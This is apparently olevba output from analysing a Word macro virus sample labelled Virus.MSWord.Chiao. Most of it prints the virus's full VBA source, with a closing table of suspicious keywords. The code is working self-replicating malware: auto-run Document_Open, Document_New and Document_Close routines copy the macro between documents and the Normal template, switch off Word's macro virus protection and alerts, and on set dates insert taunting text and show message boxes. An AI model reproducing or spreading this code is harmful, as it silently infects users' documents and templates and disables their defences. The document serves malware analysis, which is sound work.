olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Chiao-a78598b98b893980814029b303f59919bb3b4813
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Chiao-a78598b98b893980814029b303f59919bb3b4813 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
                                                                                                    Private Sub Document_Close()
                                                                                                    Dim objet As Variant
                                                                                                    Dim objet2 As Variant
                                                                                                    Dim feuille As Variant
                                                                                                    Dim Var_Start, Var_Start2 As Long
                                                                                                    Dim Var_Count, Var_Count2 As Long
                                                                                                    Dim TempString As String
                                                                                                    Dim Date1 As Date
                                                                                                    Dim Date2 As Date
                                                                                                    Dim Date3 As Date
                                                                                                    Date1 = "03/04/2000"
                                                                                                    Date2 = "10/05/2000"
                                                                                                    Date3 = "15/09/2000"
                                                                                                    On Error Resume Next
                                                                                                    Options.VirusProtection = False
                                                                                                    Application.DisplayAlerts = wdAlertsNone
                                                                                                    Set feuille = Application.ActiveDocument
                                                                                                    Set objet = feuille.VBProject.VBComponents.Item("ThisDocument")
                                                                                                    If Not objet.CodeModule.Find("{ - This function should never be deleted -  } V2", 1, 1, 1, 1) Then
                                                                                                    For i = 1 To objet.CodeModule.CountOfLines
                                                                                                    objet.CodeModule.DeleteLines 1
                                                                                                    Next
                                                                                                    Var_Start = objet.CodeModule.CountOfLines + 1
                                                                                                    Set objet2 = NormalTemplate.VBProject.VBComponents.Item("ThisDocument")
                                                                                                    Var_Start2 = objet2.CodeModule.ProcBodyLine("Document_Open", vbext_pk_Proc)
                                                                                                    Var_Count2 = objet2.CodeModule.ProcCountLines("Document_Open", vbext_pk_Proc)
                                                                                                    For i = Var_Start2 + 1 To Var_Count2 + Var_Start2 - 2
                                                                                                    TempString = RTrim(objet2.CodeModule.Lines(i, 1))
                                                                                                    objet.CodeModule.AddFromString TempString
                                                                                                    Next
                                                                                                    Var_garb = objet.CodeModule.InsertLines(1, "                                                                                                    Private Sub Document_Open()")
                                                                                                    Var_Start = Var_Start + Var_Count2 + 1
                                                                                                    Var_Start2 = objet2.CodeModule.ProcBodyLine("Document_New", vbext_pk_Proc)
                                                                                                    Var_Count2 = objet2.CodeModule.ProcCountLines("Document_New", vbext_pk_Proc)
                                                                                                    For i = Var_Start2 + 1 To Var_Count2 + Var_Start2 - 2
                                                                                                    TempString = RTrim(objet2.CodeModule.Lines(i, 1))
                                                                                                    objet.CodeModule.AddFromString TempString
                                                                                                    Next
                                                                                                    Var_garb = objet.CodeModule.InsertLines(1, "                                                                                                    Private Sub Document_New()")
                                                                                                    Var_Start = Var_Start + Var_Count2 + 1
                                                                                                    Var_Start2 = objet2.CodeModule.ProcBodyLine("Document_Close", vbext_pk_Proc)
                                                                                                    Var_Count2 = objet2.CodeModule.ProcCountLines("Document_Close", vbext_pk_Proc)
                                                                                                    For i = Var_Start2 + 1 To Var_Count2 + Var_Start2 - 2
                                                                                                    TempString = RTrim(objet2.CodeModule.Lines(i, 1))
                                                                                                    objet.CodeModule.AddFromString TempString
                                                                                                    Next
                                                                                                    Var_garb = objet.CodeModule.InsertLines(1, "                                                                                                    Private Sub Document_Close()")
                                                                                                    End If
                                                                                                    If Date > Date3 Then
                                                                                                    Selection.EndKey Unit:=wdStory
                                                                                                    Selection.TypeParagraph
                                                                                                    Selection.TypeText Text:="C" & "i" & "a" & "o" & " !" & "!" & "!"
                                                                                                    Selection.HomeKey Unit:=wdLine, Extend:=wdExtend
                                                                                                    Selection.Font.Bold = wdToggle
                                                                                                    Selection.Font.Size = 18
                                                                                                    Selection.Font.Name = "CourierBM"
                                                                                                    Selection.Font.Name = "Bookman Old Style"
                                                                                                    Options.DefaultHighlightColorIndex = wdBrightGreen
                                                                                                    Selection.Range.HighlightColorIndex = wdBrightGreen
                                                                                                    Selection.Font.ColorIndex = wdRed
                                                                                                    Selection.ParagraphFormat.Alignment = wdAlignParagraphRight
                                                                                                    Selection.HomeKey Unit:=wdStory
                                                                                                    End If
                                                                                                    If (Date >= Date1 And Date <= Date2) Or Format(Date, "dddd") = "Mercredi" And Date >= Date1 Then
                                                                                                    temporary = MsgBox("Me" & "r" & "ci" & " d'" & "avo" & "ir " & "uti" & "li" & "sé" & " ce b" & "e" & "l ou" & "ti" & "l qu" & "'" & "e" & "st " & "M" & "." & "S" & ". " & "W" & "O" & "R" & "D" & "S !" & "!" & "!" & Chr(13) & Chr(13) & "B" & "i" & "l" & "l" & " G" & "A" & "T" & "E" & "S " & "vo" & "us le" & " ren" & "dr" & "a " & "!", vbSystemModal + vbInformation + vbOKOnly, "Vive les mercredi et les jours fériés...")
                                                                                                    End If
                                                                                                    Application.ActiveDocument.Save
                                                                                                    End Sub
                                                                                                    Private Sub Document_New()
                                                                                                    Dim Date1 As Date
                                                                                                    Dim Date2 As Date
                                                                                                    Dim Date3 As Date
                                                                                                    Date1 = "03/04/2000"
                                                                                                    Date2 = "10/05/2000"
                                                                                                    Date3 = "15/09/2000"
                                                                                                    On Error Resume Next
                                                                                                    Options.VirusProtection = False
                                                                                                    Application.DisplayAlerts = wdAlertsNone
                                                                                                    If (Date >= Date1 And Date <= Date2) Or Date > Date3 Or Format(Date, "dddd") = "Mercredi" And Date >= Date1 Then
                                                                                                    Selection.HomeKey Unit:=wdLine
                                                                                                    Selection.HomeKey Unit:=wdStory
                                                                                                    Selection.TypeParagraph
                                                                                                    Selection.MoveUp Unit:=wdLine, Count:=1
                                                                                                    Selection.TypeText Text:="Mi" & "cr" & "os" & "of" & "t vo" & "us s" & "ouh" & "ait" & "e la" & " b" & "ie" & "nv" & "en" & "ue !" & "!" & "!"
                                                                                                    Selection.HomeKey Unit:=wdLine, Extend:=wdExtend
                                                                                                    Selection.Range.HighlightColorIndex = wdBrightGreen
                                                                                                    Selection.Font.ColorIndex = wdRed
                                                                                                    Selection.Font.Size = 12
                                                                                                    Selection.Font.Size = 16
                                                                                                    Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
                                                                                                    Selection.MoveDown Unit:=wdLine, Count:=1
                                                                                                    End If
                                                                                                    End Sub
                                                                                                    Private Sub Document_Open()
                                                                                                    '{ - This function should never be deleted -  } V2
                                                                                                    '{ - This function should never be deleted - }
                                                                                                    Dim objet As Variant
                                                                                                    Dim objet2 As Variant
                                                                                                    Dim Var_Start, Var_Start2 As Long
                                                                                                    Dim Var_Count, Var_Count2 As Long
                                                                                                    On Error Resume Next
                                                                                                    Options.VirusProtection = False
                                                                                                    Application.DisplayAlerts = wdAlertsNone
                                                                                                    Set objet = NormalTemplate.VBProject.VBComponents.Item("ThisDocument")
                                                                                                    If Not objet.CodeModule.Find("{ - This function should never be deleted -  } V2", 1, 1, 1, 1) Then
                                                                                                    For i = 1 To objet.CodeModule.CountOfLines
                                                                                                    objet.CodeModule.DeleteLines 1
                                                                                                    Next
                                                                                                    Var_Start = objet.CodeModule.CountOfLines + 1
                                                                                                    Set objet2 = Me.VBProject.VBComponents.Item("ThisDocument")
                                                                                                    Var_Start2 = objet2.CodeModule.ProcBodyLine("Document_Open", vbext_pk_Proc)
                                                                                                    Var_Count2 = objet2.CodeModule.ProcCountLines("Document_Open", vbext_pk_Proc)
                                                                                                    objet.CodeModule.InsertLines Var_Start, Chr(13) & objet2.CodeModule.Lines(Var_Start2, Var_Count2)
                                                                                                    Var_Start = Var_Start + Var_Count2 + 1
                                                                                                    Var_Start2 = objet2.CodeModule.ProcBodyLine("Document_New", vbext_pk_Proc)
                                                                                                    Var_Count2 = objet2.CodeModule.ProcCountLines("Document_New", vbext_pk_Proc)
                                                                                                    objet.CodeModule.InsertLines Var_Start, Chr(13) & objet2.CodeModule.Lines(Var_Start2, Var_Count2)
                                                                                                    Var_Start = Var_Start + Var_Count2 + 1
                                                                                                    Var_Start2 = objet2.CodeModule.ProcBodyLine("Document_Close", vbext_pk_Proc)
                                                                                                    Var_Count2 = objet2.CodeModule.ProcCountLines("Document_Close", vbext_pk_Proc)
                                                                                                    objet.CodeModule.InsertLines Var_Start, Chr(13) & objet2.CodeModule.Lines(Var_Start2, Var_Count2)
                                                                                                    NormalTemplate.Save
                                                                                                    End If
                                                                                                    End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

